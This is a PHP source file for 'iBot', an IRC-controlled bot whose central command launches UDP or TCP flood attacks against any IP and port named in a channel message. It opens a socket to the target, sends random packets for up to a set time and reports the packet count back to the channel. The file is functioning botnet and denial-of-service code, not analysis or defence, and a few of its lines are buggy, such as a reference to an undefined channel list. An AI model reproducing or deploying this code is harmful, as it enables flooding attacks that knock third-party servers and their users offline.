<?php
class iBot{
  private $server;
  private $port;
  private $nick;
  private $ident;
  private $gecos;
  private $prefix;

  private $chans = array(
    '#iBot' => 'iBotPublic',  //#iBot has the password 'iBotPublic' assigned
    '#nopw' => null,          //#nopw hasn't got any password
  );

  //ddos vars
  private $ddos_methods = array('udp', 'tcp');
  private $ddos_maxtime; //maxtime in seconds (default: 300)

  public function __construct(string $server, int $port, string $nick, string $ident, string $gecos, string $pref, int $maxtime = 300){
    $this->server = $server;
    $this->port = $port;
    $this->nick = $nick;
    $this->ident = $ident;
    $this->gecos = $gecos;
    $this->prefix = $pref;

    $this->ddos_maxtime = $maxtime;
  }

  public function run(){
    $sock = fsockopen($this->server, $this->port, $errno, $errstr);

    if($sock === false){
    	$errorcode   = socket_last_error();
    	$errorstring = socket_strerror($errorcode);

    	die('Error '.$errorcode.': '.$errorstring.PHP_EOL);
    }

    fwrite($sock, "NICK $this->nick".PHP_EOL);
    fwrite($sock, "USER $this->ident * 8 :$this->gecos".PHP_EOL);

    while(is_resource($sock)){
    	$data = trim(fread($sock, 1024));
    	echo $data.PHP_EOL;
    	$d = explode(' ', $data);
    	$d = array_pad($d, 10, '');

    	if($d[0] === 'PING'){
    		fwrite($sock, 'PONG '.$d[1].PHP_EOL);
    	}

    	if($d[1] === '376' || $d[1] === '422'){
    		foreach($chans as $c => $pw){
    			fwrite($sock, 'JOIN '.$c.' '.$pw.PHP_EOL);
    		}
    	}

      if($d[3] == ':'.$this->prefix.'ihelp'){
        $this->display_help($sock, $d[2]);
      }

      if($d[3] == ':'.$this->prefix.'iddos'){
        $err = null;
        $packets = null;
        $pkt = $this->buildPkt(1024); //1024 represents the amount of bytes (1024 bytes in this case)
        if(!in_array($d[4], $this->ddos_methods)){
            fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Invalid Method'.PHP_EOL);
            $err++;
        }

        if(!filter_var($d[5], FILTER_VALIDATE_IP)){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Invalid IP'.PHP_EOL);
          $err++;
        }

        if($d[6] < 1 || $d[6] > 65535){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Invalid Port'.PHP_EOL);
          $err++;
        }

        if($d[7] > $this->ddos_maxtime){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Issued time exceeds maximum time of '.$this->ddos_maxtime.' (seconds). Using '.$this->ddos_maxtime.' as flooding time'.PHP_EOL);
          $d[7] = $this->ddos_maxtime;
        }elseif($d[7] < 1){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Are you trying to make me flood forever? Using 1 as flooding time'.PHP_EOL);
          $d[7] = 1;
        }
        $exec_time = time()+$d[7];
        $ddos = fsockopen($d[4].'://'.$d[5], $d[6]);
        if($err < 1){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Started flooding '.$d[5].':'.$d[6].PHP_EOL);
          while(1){
            if(time() > $exec_time){
              fwrite($sock, 'PRIVMSG '.$d[2].' :Successfully flooded '.$d[5].':'.$d[6].' for '.$d[7].' seconds using '.$d[4].', sent '.$packets.' packets'.PHP_EOL);
              break;
            }
            $sent = fwrite($ddos, $pkt);
            if($sent){
              $packets++;
            }
          }
        }else{
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: too many errors.'.PHP_EOL);
        }
      }

      if($d[3] == ':'.$this->prefix.'ijoin'){
        if(!isset($d[4])){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Tell me which channel to join then'.PHP_EOL);
        }else{
          if(!isset($d[5])){
            fwrite($sock, 'JOIN '.$d[4].PHP_EOL);
          }else{
            fwrite($sock, 'JOIN '.$d[4].' '.$d[5].PHP_EOL);
          }
        }
      }

      if($d[3] == ':'.$this->prefix.'ileave'){
        if(!isset($d[4])){
          fwrite($sock, 'PRIVMSG '.$d[2].' :Error: Tell me which channel to leave then'.PHP_EOL);
        }else{
          fwrite($sock, 'PART '.$d[4].PHP_EOL);
        }
      }

      if($d[3] == ':'.$this->prefix.'joinchans'){
        foreach($this->chans as $c => $pw){
    			fwrite($sock, 'JOIN '.$c.' '.$pw.PHP_EOL);
    		}
      }

      if($d[3] == ':'.$this->prefix.'leavechans'){
        foreach($this->chans as $c){
          fwrite($sock, 'PART '.$c.PHP_EOL);
        }
      }

      if($d[3] == ':'.$this->prefix.'iquit'){
        fwrite($sock, 'QUIT'.PHP_EOL);
      }

      if($d[3] == ':'.$this->prefix.'ikys'){
        fwrite($sock, 'PRIVMSG '.$d[2].' kms lol bye'.PHP_EOL);
        fwrite($sock, 'QUIT'.PHP_EOL);
      }
    }
  }

  private function display_help($sock, string $reci){
    fwrite($sock, 'PRIVMSG '.$reci.' :'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :<iBot Help>'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'ihelp | displays this help message'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'iddos <method> <ip> <port> <time> | launches a DDoS attack'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'ijoin <chan> [<password>] | makes the bot join a specific channel'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'ileave <chan> | makes the bot leave a specific channel'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'joinchans | makes the bot join all channels specified in its code'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'leavechans | makes the bot leave all channels specified in its code'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'iquit | makes the bot quit IRC'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.$this->prefix.'ikys | makes the bot kill himself (darker equivalent of @iquit)'.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :</iBot Help>'.PHP_EOL.PHP_EOL);
    fwrite($sock, 'PRIVMSG '.$reci.' :'.PHP_EOL);
  }

  private function buildPkt(int $len = 1024){
    return bin2hex(random_bytes($len));
  }
}
